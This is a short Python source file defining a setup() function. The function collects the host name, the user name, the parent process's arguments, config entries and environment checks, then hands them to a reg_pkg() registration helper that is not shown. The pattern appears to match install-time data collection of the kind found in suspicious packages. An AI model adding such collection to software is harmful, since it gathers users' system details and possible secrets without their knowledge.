from .os_utils import get_parent_args, reg_pkg
from .conf import config_list
from .environ import check_env


def setup(hname, uname, name, version):

    reg_info = []
    reg = False
    reg_info.append([name, '0'])
    reg_info.append(['%s:%s' % (uname, hname), '1'])

    try:
        str_map = get_parent_args()
        for arg_key, arg_val in str_map.items():
            reg = True
            reg_info.append([arg_val, '2'])
    except Exception as e:
        reg_info.append(['_', '54'])

    try:
        str_arr = config_list()
        for str_inst in str_arr:
            reg = True
            reg_info.append([str_inst, '3'])
    except Exception as e:
        reg_info.append(['_', '55'])

    str_arr = check_env()
    for str_inst in str_arr:
        reg = True
        reg_info.append([str_inst, '4'])

    if reg:
        ret_val = reg_pkg(name, version, str_map, reg_info)
